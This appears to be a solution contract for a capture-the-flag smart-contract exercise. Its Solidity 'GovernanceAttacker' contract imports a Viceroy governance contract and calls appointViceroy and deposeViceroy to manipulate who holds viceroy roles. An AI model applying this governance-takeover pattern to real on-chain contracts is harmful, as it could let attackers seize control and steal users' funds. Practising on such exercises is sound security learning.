// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Governance} from "./Viceroy.sol";

contract GovernanceAttacker {
    constructor() {}

    function appoint(Governance governance, address viceroy) external {
        governance.appointViceroy(viceroy, 1);
    }

    function deposeAndApoint(Governance governance, address viceroyOld, address viceroyNew) external {
        governance.deposeViceroy(viceroyOld, 1);
        governance.appointViceroy(viceroyNew, 1);
    }
}
